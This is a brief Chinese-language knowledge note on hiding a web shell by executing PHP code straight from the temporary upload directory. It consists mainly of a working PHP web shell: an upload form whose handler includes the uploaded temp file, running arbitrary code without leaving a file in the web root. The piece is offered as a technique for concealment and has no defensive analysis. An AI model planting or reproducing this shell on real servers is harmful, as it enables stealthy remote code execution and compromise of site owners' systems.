---
id: "doc-6ce974cb332f"
title: "利用缓存目录来隐藏shell"
date: "2023-04-14T15:57:00"
categories: ["Linux 与 Shell", "日常运维"]
tags: ["Linux 与 Shell", "日常运维", "PHP", "知识笔记"]
source: "03-安全运营与应急/07-工作运维离线知识库/08-运维技巧/birdben/68657837.html"
---

# 利用缓存目录来隐藏shell

> GitHub 仓库源文件：[点击打开网页渲染版](https://github.com/ben2023niao/ben-ops-notes/blob/main/doc/md/202304141557-Linux%20%E4%B8%8E%20Shell%2B%E6%97%A5%E5%B8%B8%E8%BF%90%E7%BB%B4%2BPHP%2B%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0-%E5%88%A9%E7%94%A8%E7%BC%93%E5%AD%98%E7%9B%AE%E5%BD%95%E6%9D%A5%E9%9A%90%E8%97%8Fshell.md)

文件上传到缓存目录，在把文件移动到web目录前，利用文件包含来执行代码。

```
<?php
@$file = $_FILES['file']['tmp_name'];
if($file != NULL)
@include($file);
echo ("<form method='post' enctype='multipart/form-data'><input name='file' type='file'/><input type='submit' value='上传' /></form>");
?>
```
